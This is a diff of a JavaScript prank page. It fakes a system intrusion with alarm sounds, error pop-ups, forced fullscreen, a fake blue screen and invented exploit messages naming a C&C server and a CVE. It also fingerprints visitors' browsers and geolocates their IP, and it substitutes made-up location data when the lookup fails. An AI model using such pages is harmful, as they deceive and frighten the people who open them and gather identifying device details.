+                releaseOsc.start(audioContext.currentTime);
+                releaseOsc.stop(audioContext.currentTime + 0.008);
+            }, 8);
+        }
+
+        // Son d'alerte critique
+        function playAlertSound() {
+            if (!audioContext) return;
+            
+            const osc = audioContext.createOscillator();
+            const gain = audioContext.createGain();
+            const filter = audioContext.createBiquadFilter();
+            
+            osc.connect(filter);
+            filter.connect(gain);
+            gain.connect(audioContext.destination);
+            
+            osc.frequency.setValueAtTime(700, audioContext.currentTime);
+            osc.frequency.linearRampToValueAtTime(1100, audioContext.currentTime + 0.1);
+            osc.frequency.linearRampToValueAtTime(700, audioContext.currentTime + 0.2);
+            
+            osc.type = 'sawtooth';
+            filter.type = 'lowpass';
+            filter.frequency.value = 2500;
+            
+            gain.gain.setValueAtTime(0.18, audioContext.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.25);
+            
+            osc.start(audioContext.currentTime);
+            osc.stop(audioContext.currentTime + 0.25);
+        }
+
+        // Son de transfert de données
+        function playDataTransferSound() {
+            if (!audioContext) return;
+            for (let i = 0; i < 6; i++) {
+                setTimeout(() => {
+                    const osc = audioContext.createOscillator();
+                    const gain = audioContext.createGain();
+                    
+                    osc.connect(gain);
+                    gain.connect(audioContext.destination);
+                    
+                    osc.frequency.value = 400 + (i * 80);
+                    osc.type = 'sine';
+                    
+                    gain.gain.setValueAtTime(0.06, audioContext.currentTime);
+                    gain.gain.exponentialRampToValueAtTime(0.001, audioContext.currentTime + 0.08);
+                    
+                    osc.start(audioContext.currentTime);
+                    osc.stop(audioContext.currentTime + 0.08);
+                }, i * 45);
+            }
+        }
+
+        // Son d'accès disque (lecture/écriture)
+        function playDiskAccessSound() {
+            if (!audioContext) return;
+            
+            // Créer un bruit blanc filtré pour simuler l'accès disque
+            const bufferSize = 4096;
+            const buffer = audioContext.createBuffer(1, bufferSize, audioContext.sampleRate);
+            const data = buffer.getChannelData(0);
+            
+            for (let i = 0; i < bufferSize; i++) {
+                data[i] = Math.random() * 0.15 - 0.075;
+            }
+            
+            const noise = audioContext.createBufferSource();
+            const gain = audioContext.createGain();
+            const filter = audioContext.createBiquadFilter();
+            
+            noise.buffer = buffer;
+            noise.connect(filter);
+            filter.connect(gain);
+            gain.connect(audioContext.destination);
+            
+            filter.type = 'bandpass';
+            filter.frequency.value = 1500 + Math.random() * 1000;
+            filter.Q.value = 8;
+            
+            gain.gain.setValueAtTime(0.04, audioContext.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.001, audioContext.currentTime + 0.06);
+            
+            noise.start(audioContext.currentTime);
+            noise.stop(audioContext.currentTime + 0.06);
+        }
+
+        // Son critique système
+        function playCriticalSound() {
+            if (!audioContext) return;
+            
+            const osc = audioContext.createOscillator();
+            const gain = audioContext.createGain();
+            const filter = audioContext.createBiquadFilter();
+            
+            osc.connect(filter);
+            filter.connect(gain);
+            gain.connect(audioContext.destination);
+            
+            osc.frequency.setValueAtTime(250, audioContext.currentTime);
+            osc.frequency.setValueAtTime(300, audioContext.currentTime + 0.15);
+            osc.frequency.setValueAtTime(250, audioContext.currentTime + 0.3);
+            
+            osc.type = 'sawtooth';
+            filter.type = 'lowpass';
+            filter.frequency.value = 1500;
+            
+            gain.gain.setValueAtTime(0.2, audioContext.currentTime);
+            gain.gain.setValueAtTime(0.2, audioContext.currentTime + 0.3);
+            gain.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
+            
+            osc.start(audioContext.currentTime);
+            osc.stop(audioContext.currentTime + 0.5);
+        }
+
+        // Fonction pour obtenir TOUTES les informations accessibles
+        async function getAllSystemInfo() {
+            const info = {
+                ip: 'Acquiring...',
+                city: 'Acquiring...',
+                region: 'Acquiring...',
+                country: 'Acquiring...',
+                postal: 'Acquiring...',
+                latitude: '0.0',
+                longitude: '0.0',
+                isp: 'Acquiring...',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                userAgent: navigator.userAgent,
+                browser: getBrowserInfo(),
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages.join(', '),
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'Not set',
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenColorDepth: screen.colorDepth,
+                screenPixelDepth: screen.pixelDepth,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                orientation: screen.orientation ? screen.orientation.type : 'N/A',
+                windowWidth: window.innerWidth,
+                windowHeight: window.innerHeight,
+                devicePixelRatio: window.devicePixelRatio,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A',
+                maxTouchPoints: navigator.maxTouchPoints,
+                connectionType: 'N/A',
+                connectionEffectiveType: 'N/A',
+                connectionDownlink: 'N/A',
+                connectionRtt: 'N/A',
+                localTime: new Date().toLocaleString('en-US'),
+                timestamp: Date.now(),
+                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
+                webdriver: navigator.webdriver || false,
+                vendor: navigator.vendor,
+                canvasFingerprint: getCanvasFingerprint(),
+                webglVendor: 'Detecting...',
+                webglRenderer: 'Detecting...',
+                batteryLevel: 'Detecting...',
+                batteryCharging: 'Detecting...',
+            };
+            
+            if (navigator.connection) {
+                info.connectionType = navigator.connection.type || navigator.connection.effectiveType || 'N/A';
+                info.connectionEffectiveType = navigator.connection.effectiveType || 'N/A';
+                info.connectionDownlink = navigator.connection.downlink ? navigator.connection.downlink + ' Mbps' : 'N/A';
+                info.connectionRtt = navigator.connection.rtt ? navigator.connection.rtt + ' ms' : 'N/A';
+            }
+            
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        info.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        info.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+            } catch (e) {
+                info.webglVendor = 'Access denied';
+                info.webglRenderer = 'Access denied';
+            }
+            
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    info.batteryLevel = Math.round(battery.level * 100) + '%';
+                    info.batteryCharging = battery.charging ? 'Charging' : 'Discharging';
+                } catch (e) {
+                    info.batteryLevel = 'Access denied';
+                    info.batteryCharging = 'Access denied';
+                }
+            }
+            
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                info.ip = ipData.ip;
+                
+                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const locationData = await locationResponse.json();
+                
+                info.city = locationData.city || 'Unknown';
+                info.region = locationData.region || 'Unknown';
+                info.country = locationData.country_name || 'Unknown';
+                info.postal = locationData.postal || 'Unknown';
+                info.latitude = locationData.latitude || '0.0';
+                info.longitude = locationData.longitude || '0.0';
+                info.isp = locationData.org || 'Unknown';
+            } catch (error) {
+                info.ip = '192.168.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255);
+                info.city = 'Paris';
+                info.region = 'Île-de-France';
+                info.country = 'France';
+                info.postal = '75001';
+                info.latitude = '48.8566';
+                info.longitude = '2.3522';
+                info.isp = 'Orange S.A.';
+            }
+            
+            return info;
+        }
+        
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            if (ua.indexOf('Firefox') > -1) return 'Mozilla Firefox';
+            if (ua.indexOf('SamsungBrowser') > -1) return 'Samsung Internet';
+            if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) return 'Opera';
+            if (ua.indexOf('Trident') > -1) return 'Internet Explorer';
+            if (ua.indexOf('Edge') > -1) return 'Microsoft Edge';
+            if (ua.indexOf('Chrome') > -1) return 'Google Chrome';
+            if (ua.indexOf('Safari') > -1) return 'Safari';
+            return 'Unknown Browser';
+        }
+        
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.textBaseline = 'alphabetic';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Browser Fingerprint', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Browser Fingerprint', 4, 17);
+                return canvas.toDataURL().slice(-50);
+            } catch (e) {
+                return 'Unable to generate';
+            }
+        }
+
         function createErrorWindow() {
             const error = errorMessages[Math.floor(Math.random() * errorMessages.length)];
             const errorWindow = document.createElement('div');
             errorWindow.className = 'error-window';
             
-            // Position aléatoire
-            const maxX = window.innerWidth - 420;
+            const maxX = window.innerWidth - 470;
             const maxY = window.innerHeight - 300;
             const randomX = Math.max(20, Math.random() * maxX);
             const randomY = Math.max(20, Math.random() * maxY);
@@ -613,7 +991,7 @@
             
             errorWindow.innerHTML = `
                 <div class="error-title-bar">
-                    <div class="error-icon-title">⚠️</div>
+                    <div class="error-icon-title">${error.icon}</div>
                     <div class="error-title-text">${error.title}</div>
                     <button class="error-close-btn">×</button>
                 </div>
@@ -623,17 +1001,15 @@
                 </div>
                 <div class="error-buttons">
                     <button class="error-btn">OK</button>
-                    <button class="error-btn">Annuler</button>
+                    <button class="error-btn">Cancel</button>
                 </div>
             `;
             
             document.body.appendChild(errorWindow);
             errorCount++;
             
-            // Rendre la fenêtre déplaçable
             makeDraggable(errorWindow);
             
-            // Boutons de fermeture
             const closeBtn = errorWindow.querySelector('.error-close-btn');
             const okBtn = errorWindow.querySelectorAll('.error-btn')[0];
             const cancelBtn = errorWindow.querySelectorAll('.error-btn')[1];
@@ -658,12 +1034,8 @@
                 createErrorWindow();
                 errorWindow.remove();
             });
-            
-            // Jouer un son d'erreur (simulé visuellement)
-            playErrorSound();
         }
 
-        // Fonction pour rendre une fenêtre déplaçable
         function makeDraggable(element) {
             let pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
             const titleBar = element.querySelector('.error-title-bar');
@@ -694,363 +1066,10 @@
             }
         }
 
-        // Simulation visuelle du son d'erreur
-        function playErrorSound() {
-            document.body.style.animation = 'none';
-            setTimeout(() => {
-                document.body.style.animation = '';
-            }, 10);
-        }
-
-        // Fonction pour obtenir TOUTES les informations accessibles légalement
-        async function getAllSystemInfo() {
-            const info = {
-                // Informations IP et géolocalisation
-                ip: 'Récupération...',
-                city: 'Récupération...',
-                region: 'Récupération...',
-                country: 'Récupération...',
-                postal: 'Récupération...',
-                latitude: '0.0',
-                longitude: '0.0',
-                isp: 'Récupération...',
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                
-                // Informations navigateur
-                userAgent: navigator.userAgent,
-                browser: getBrowserInfo(),
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages.join(', '),
-                cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack || 'Non défini',
-                
-                // Informations d'écran
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                screenColorDepth: screen.colorDepth,
-                screenPixelDepth: screen.pixelDepth,
-                availWidth: screen.availWidth,
-                availHeight: screen.availHeight,
-                orientation: screen.orientation ? screen.orientation.type : 'Non disponible',
-                
-                // Informations de fenêtre
-                windowWidth: window.innerWidth,
-                windowHeight: window.innerHeight,
-                devicePixelRatio: window.devicePixelRatio,
-                
-                // Informations système
-                hardwareConcurrency: navigator.hardwareConcurrency || 'Non disponible',
-                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Non disponible',
-                maxTouchPoints: navigator.maxTouchPoints,
-                
-                // Informations de connexion
-                connectionType: 'Non disponible',
-                connectionEffectiveType: 'Non disponible',
-                connectionDownlink: 'Non disponible',
-                connectionRtt: 'Non disponible',
-                
-                // Date et heure
-                localTime: new Date().toLocaleString('fr-FR'),
-                timestamp: Date.now(),
-                
-                // Plugins et fonctionnalités
-                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
-                webdriver: navigator.webdriver || false,
-                vendor: navigator.vendor,
-                
-                // Canvas fingerprint (pour l'unicité)
-                canvasFingerprint: getCanvasFingerprint(),
-                
-                // WebGL info
-                webglVendor: 'Détection...',
-                webglRenderer: 'Détection...',
-                
-                // Batterie (si disponible)
-                batteryLevel: 'Détection...',
-                batteryCharging: 'Détection...',
-                
-                // Permissions
-                permissionsChecked: false
-            };
-            
-            // Récupérer les infos de connexion si disponibles
-            if (navigator.connection) {
-                info.connectionType = navigator.connection.type || navigator.connection.effectiveType || 'Non disponible';
-                info.connectionEffectiveType = navigator.connection.effectiveType || 'Non disponible';
-                info.connectionDownlink = navigator.connection.downlink ? navigator.connection.downlink + ' Mbps' : 'Non disponible';
-                info.connectionRtt = navigator.connection.rtt ? navigator.connection.rtt + ' ms' : 'Non disponible';
-            }
-            
-            // Récupérer les infos WebGL
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        info.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                        info.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    }
-                }
-            } catch (e) {
-                info.webglVendor = 'Non accessible';
-                info.webglRenderer = 'Non accessible';
-            }
-            
-            // Récupérer les infos de batterie
-            if (navigator.getBattery) {
-                try {
-                    const battery = await navigator.getBattery();
-                    info.batteryLevel = Math.round(battery.level * 100) + '%';
-                    info.batteryCharging = battery.charging ? 'En charge' : 'Sur batterie';
-                } catch (e) {
-                    info.batteryLevel = 'Non accessible';
-                    info.batteryCharging = 'Non accessible';
-                }
-            }
-            
-            // Récupérer l'IP et la géolocalisation
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                info.ip = ipData.ip;
-                
-                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                const locationData = await locationResponse.json();
-                
-                info.city = locationData.city || 'Inconnu';
-                info.region = locationData.region || 'Inconnu';
-                info.country = locationData.country_name || 'Inconnu';
-                info.postal = locationData.postal || 'Inconnu';
-                info.latitude = locationData.latitude || '0.0';
-                info.longitude = locationData.longitude || '0.0';
-                info.isp = locationData.org || 'Inconnu';
-            } catch (error) {
-                info.ip = '192.168.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255);
-                info.city = 'Paris';
-                info.region = 'Île-de-France';
-                info.country = 'France';
-                info.postal = '75001';
-                info.latitude = '48.8566';
-                info.longitude = '2.3522';
-                info.isp = 'Orange S.A.';
-            }
-            
-            return info;
-        }
-        
-        function getBrowserInfo() {
-            const ua = navigator.userAgent;
-            if (ua.indexOf('Firefox') > -1) return 'Mozilla Firefox';
-            if (ua.indexOf('SamsungBrowser') > -1) return 'Samsung Internet';
-            if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) return 'Opera';
-            if (ua.indexOf('Trident') > -1) return 'Internet Explorer';
-            if (ua.indexOf('Edge') > -1) return 'Microsoft Edge';
-            if (ua.indexOf('Chrome') > -1) return 'Google Chrome';
-            if (ua.indexOf('Safari') > -1) return 'Safari';
-            return 'Navigateur inconnu';
-        }
-        
-        function getCanvasFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.textBaseline = 'alphabetic';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = '#069';
-                ctx.fillText('Browser Fingerprint', 2, 15);
-                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-                ctx.fillText('Browser Fingerprint', 4, 17);
-                return canvas.toDataURL().slice(-50);
-            } catch (e) {
-                return 'Impossible';
-            }
-        }
-
-        // Créer des sons synthétiques ultra réalistes
-        const AudioContext = window.AudioContext || window.webkitAudioContext;
-        let audioContext;
-        
-        function initAudio() {
-            if (!audioContext) {
-                audioContext = new AudioContext();
-            }
-        }
-
-        // Son d'erreur Windows authentique (double beep)
-        function playErrorBeep() {
-            if (!audioContext) return;
-            
-            // Premier beep
-            const osc1 = audioContext.createOscillator();
-            const gain1 = audioContext.createGain();
-            osc1.connect(gain1);
-            gain1.connect(audioContext.destination);
-            osc1.frequency.value = 800;
-            osc1.type = 'sine';
-            gain1.gain.setValueAtTime(0.15, audioContext.currentTime);
-            gain1.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.1);
-            osc1.start(audioContext.currentTime);
-            osc1.stop(audioContext.currentTime + 0.1);
-            
-            // Deuxième beep légèrement plus bas
-            setTimeout(() => {
-                const osc2 = audioContext.createOscillator();
-                const gain2 = audioContext.createGain();
-                osc2.connect(gain2);
-                gain2.connect(audioContext.destination);
-                osc2.frequency.value = 600;
-                osc2.type = 'sine';
-                gain2.gain.setValueAtTime(0.15, audioContext.currentTime);
-                gain2.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.15);
-                osc2.start(audioContext.currentTime);
-                osc2.stop(audioContext.currentTime + 0.15);
-            }, 100);
-        }
-
-        // Son de typing réaliste
-        function playTypingSound() {
-            if (!audioContext) return;
-            const oscillator = audioContext.createOscillator();
-            const gainNode = audioContext.createGain();
-            const filter = audioContext.createBiquadFilter();
-            
-            oscillator.connect(filter);
-            filter.connect(gainNode);
-            gainNode.connect(audioContext.destination);
-            
-            oscillator.frequency.value = 150 + Math.random() * 50;
-            oscillator.type = 'square';
-            filter.type = 'lowpass';
-            filter.frequency.value = 2000;
-            
-            gainNode.gain.setValueAtTime(0.03, audioContext.currentTime);
-            gainNode.gain.exponentialRampToValueAtTime(0.001, audioContext.currentTime + 0.03);
-            
-            oscillator.start(audioContext.currentTime);
-            oscillator.stop(audioContext.currentTime + 0.03);
-        }
-
-        // Son d'alerte critique style système Windows
-        function playAlertSound() {
-            if (!audioContext) return;
-            
-            const oscillator = audioContext.createOscillator();
-            const gainNode = audioContext.createGain();
-            const filter = audioContext.createBiquadFilter();
-            
-            oscillator.connect(filter);
-            filter.connect(gainNode);
-            gainNode.connect(audioContext.destination);
-            
-            // Son d'alerte montant
-            oscillator.frequency.setValueAtTime(600, audioContext.currentTime);
-            oscillator.frequency.linearRampToValueAtTime(1000, audioContext.currentTime + 0.1);
-            oscillator.frequency.linearRampToValueAtTime(600, audioContext.currentTime + 0.2);
-            
-            oscillator.type = 'sawtooth';
-            filter.type = 'lowpass';
-            filter.frequency.value = 3000;
-            
-            gainNode.gain.setValueAtTime(0.2, audioContext.currentTime);
-            gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.25);
-            
-            oscillator.start(audioContext.currentTime);
-            oscillator.stop(audioContext.currentTime + 0.25);
-        }
-
-        // Son de transfert de données (bips successifs)
-        function playDataTransferSound() {
-            if (!audioContext) return;
-            for (let i = 0; i < 8; i++) {
-                setTimeout(() => {
-                    const oscillator = audioContext.createOscillator();
-                    const gainNode = audioContext.createGain();
-                    
-                    oscillator.connect(gainNode);
-                    gainNode.connect(audioContext.destination);
-                    
-                    oscillator.frequency.value = 300 + (i * 50);
-                    oscillator.type = 'sine';
-                    
-                    gainNode.gain.setValueAtTime(0.08, audioContext.currentTime);
-                    gainNode.gain.exponentialRampToValueAtTime(0.001, audioContext.currentTime + 0.08);
-                    
-                    oscillator.start(audioContext.currentTime);
-                    oscillator.stop(audioContext.currentTime + 0.08);
-                }, i * 40);
-            }
-        }
-
-        // Son d'accès disque dur (crépitement)
-        function playDiskAccessSound() {
-            if (!audioContext) return;
-            for (let i = 0; i < 3; i++) {
-                setTimeout(() => {
-                    const bufferSize = 2048;
-                    const buffer = audioContext.createBuffer(1, bufferSize, audioContext.sampleRate);
-                    const data = buffer.getChannelData(0);
-                    
-                    for (let j = 0; j < bufferSize; j++) {
-                        data[j] = Math.random() * 0.1 - 0.05;
-                    }
-                    
-                    const noise = audioContext.createBufferSource();
-                    const gainNode = audioContext.createGain();
-                    const filter = audioContext.createBiquadFilter();
-                    
-                    noise.buffer = buffer;
-                    noise.connect(filter);
-                    filter.connect(gainNode);
-                    gainNode.connect(audioContext.destination);
-                    
-                    filter.type = 'bandpass';
-                    filter.frequency.value = 1000 + Math.random() * 1000;
-                    
-                    gainNode.gain.setValueAtTime(0.05, audioContext.currentTime);
-                    gainNode.gain.exponentialRampToValueAtTime(0.001, audioContext.currentTime + 0.05);
-                    
-                    noise.start(audioContext.currentTime);
-                    noise.stop(audioContext.currentTime + 0.05);
-                }, i * 60);
-            }
-        }
-
-        // Son de système critique (alarme grave)
-        function playCriticalSound() {
-            if (!audioContext) return;
-            
-            const oscillator = audioContext.createOscillator();
-            const gainNode = audioContext.createGain();
-            
-            oscillator.connect(gainNode);
-            gainNode.connect(audioContext.destination);
-            
-            oscillator.frequency.setValueAtTime(200, audioContext.currentTime);
-            oscillator.frequency.setValueAtTime(250, audioContext.currentTime + 0.15);
-            oscillator.frequency.setValueAtTime(200, audioContext.currentTime + 0.3);
-            
-            oscillator.type = 'sawtooth';
-            
-            gainNode.gain.setValueAtTime(0.25, audioContext.currentTime);
-            gainNode.gain.setValueAtTime(0.25, audioContext.currentTime + 0.3);
-            gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
-            
-            oscillator.start(audioContext.currentTime);
-            oscillator.stop(audioContext.currentTime + 0.5);
-        }
-
-        // Fonction pour passer en plein écran
         function requestFullscreen() {
             const elem = document.documentElement;
             if (elem.requestFullscreen) {
-                elem.requestFullscreen().catch(err => {
-                    console.log('Fullscreen request failed:', err);
-                });
+                elem.requestFullscreen().catch(err => {});
             } else if (elem.webkitRequestFullscreen) {
                 elem.webkitRequestFullscreen();
             } else if (elem.msRequestFullscreen) {
@@ -1058,10 +1077,9 @@
             }
         }
 
-        // Fonction pour l'écran bleu final
         function showFinalBsod() {
-            playAlertSound();
-            playAlertSound();
+            playCriticalSound();
+            playCriticalSound();
             
             setTimeout(() => {
                 const hackingScreen = document.getElementById('hackingScreen');
@@ -1070,16 +1088,14 @@
                 hackingScreen.classList.remove('active');
                 finalBsod.classList.add('active');
                 
-                // Jouer une série de sons d'alerte
                 for (let i = 0; i < 5; i++) {
                     setTimeout(() => {
                         playAlertSound();
-                    }, i * 500);
+                    }, i * 600);
                 }
             }, 1000);
         }
 
-        // Fonction pour l'écran de hacking
         async function startHacking() {
             if (hackingStarted) return;
             hackingStarted = true;
@@ -1088,188 +1104,193 @@
             const terminal = document.getElementById('hackTerminal');
             
             hackingScreen.classList.add('active');
-            playAlertSound();
+            playCriticalSound();
 
             const systemInfo = await getAllSystemInfo();
 
             const hackingMessages = [
-                { text: '██████████████████████████████████████████████████████████', class: 'red', delay: 50, sound: 'critical' },
-                { text: '█                                                        █', class: 'red', delay: 20, sound: null },
-                { text: '█         [!!! INTRUSION DÉTECTÉE !!!]                  █', class: 'red', delay: 20, sound: 'alert' },
-                { text: '█    ACCÈS NON AUTORISÉ AU SYSTÈME EN COURS             █', class: 'red', delay: 20, sound: null },
-                { text: '█                                                        █', class: 'red', delay: 20, sound: null },
-                { text: '██████████████████████████████████████████████████████████', class: 'red', delay: 50, sound: null },
-                { text: '', class: '', delay: 300, sound: null },
-                { text: '[INIT] Initialisation du protocole d\'intrusion...', class: 'yellow', delay: 150, sound: 'type' },
-                { text: '[INIT] Chargement des modules d\'exploitation...', class: 'yellow', delay: 150, sound: 'type' },
-                { text: '[INIT] Établissement du tunnel crypté...', class: 'yellow', delay: 200, sound: 'type' },
-                { text: '', class: '', delay: 100, sound: null },
-                { text: '> Connexion au serveur C&C (185.220.101.47)...', class: '', delay: 200, sound: 'type' },
-                { text: '> Handshake SSL/TLS établi', class: 'cyan', delay: 250, sound: null },
-                { text: '> Tunnel chiffré AES-256 actif', class: 'cyan', delay: 250, sound: null },
-                { text: '', class: '', delay: 100, sound: null },
-                { text: '▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 20%', class: 'yellow', delay: 250, sound: null },
-                { text: '▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░ 40%', class: 'yellow', delay: 250, sound: null },
-                { text: '▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░ 60%', class: 'yellow', delay: 250, sound: null },
-                { text: '▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 80%', class: 'yellow', delay: 250, sound: null },
-                { text: '▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 100%', class: 'cyan', delay: 250, sound: 'data' },
-                { text: '', class: '', delay: 100, sound: null },
-                { text: '[OK] Connexion sécurisée établie avec succès', class: 'cyan', delay: 300, sound: null },
-                { text: '', class: '', delay: 200, sound: null },
-                { text: '[SCAN] Analyse de la topologie réseau...', class: 'yellow', delay: 200, sound: 'type' },
-                { text: '[SCAN] Énumération des services actifs...', class: 'yellow', delay: 200, sound: 'disk' },
-                { text: '[SCAN] Détection des vulnérabilités système...', class: 'yellow', delay: 200, sound: 'disk' },
-                { text: '', class: '', delay: 150, sound: null },
-                { text: '[EXPLOIT] Exploitation de CVE-2024-38063 (RCE Windows)...', class: 'yellow', delay: 300, sound: 'type' },
-                { text: '[EXPLOIT] Bypass du Windows Defender en cours...', class: 'yellow', delay: 300, sound: 'type' },
-                { text: '[EXPLOIT] Élévation de privilèges (SYSTEM)...', class: 'yellow', delay: 300, sound: 'type' },
-                { text: '', class: '', delay: 100, sound: null },
-                { text: '[SUCCESS] Accès SYSTEM obtenu', class: 'cyan', delay: 300, sound: 'alert' },
-                { text: '[SUCCESS] Défenses système désactivées', class: 'cyan', delay: 300, sound: null },
-                { text: '', class: '', delay: 200, sound: null },
-                { text: '═══════════════════════════════════════════════════════', class: 'white', delay: 50, sound: null },
-                { text: '           EXTRACTION DES DONNÉES SYSTÈME', class: 'red', delay: 100, sound: 'alert' },
-                { text: '═══════════════════════════════════════════════════════', class: 'white', delay: 50, sound: null },
-                { text: '', class: '', delay: 150, sound: null },
-                { text: '┌─ INFORMATIONS RÉSEAU ────────────────────────────────┐', class: 'cyan', delay: 100, sound: null },
-                { text: `│ Adresse IPv4       : ${systemInfo.ip}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Localisation       : ${systemInfo.city}, ${systemInfo.region}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Pays               : ${systemInfo.country}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Code postal        : ${systemInfo.postal}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Coordonnées GPS    : ${systemInfo.latitude}, ${systemInfo.longitude}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Fournisseur (ISP)  : ${systemInfo.isp}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Fuseau horaire     : ${systemInfo.timezone}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Type connexion     : ${systemInfo.connectionEffectiveType}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Vitesse download   : ${systemInfo.connectionDownlink}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Latence RTT        : ${systemInfo.connectionRtt}`, class: 'white', delay: 150, sound: 'type' },
-                { text: '└───────────────────────────────────────────────────────┘', class: 'cyan', delay: 100, sound: null },
-                { text: '', class: '', delay: 150, sound: null },
-                { text: '┌─ SYSTÈME & MATÉRIEL ──────────────────────────────────┐', class: 'cyan', delay: 100, sound: null },
-                { text: `│ Navigateur         : ${systemInfo.browser}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Plateforme OS      : ${systemInfo.platform}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ User Agent         : ${systemInfo.userAgent.substring(0, 50)}...`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Langue système     : ${systemInfo.language}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Langues dispo      : ${systemInfo.languages}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ CPU (cœurs)        : ${systemInfo.hardwareConcurrency} cœurs logiques`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Mémoire RAM        : ${systemInfo.deviceMemory}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Carte graphique    : ${systemInfo.webglRenderer}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Fabricant GPU      : ${systemInfo.webglVendor}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Points tactiles    : ${systemInfo.maxTouchPoints}`, class: 'white', delay: 150, sound: 'type' },
-                { text: '└───────────────────────────────────────────────────────┘', class: 'cyan', delay: 100, sound: null },
-                { text: '', class: '', delay: 150, sound: null },
-                { text: '┌─ AFFICHAGE & RÉSOLUTION ──────────────────────────────┐', class: 'cyan', delay: 100, sound: null },
-                { text: `│ Résolution écran   : ${systemInfo.screenWidth}x${systemInfo.screenHeight}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Résolution fenêtre : ${systemInfo.windowWidth}x${systemInfo.windowHeight}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Profondeur couleur : ${systemInfo.screenColorDepth} bits`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Pixel Ratio        : ${systemInfo.devicePixelRatio}x`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Zone disponible    : ${systemInfo.availWidth}x${systemInfo.availHeight}`, class: 'white', delay: 150, sound: 'type' },
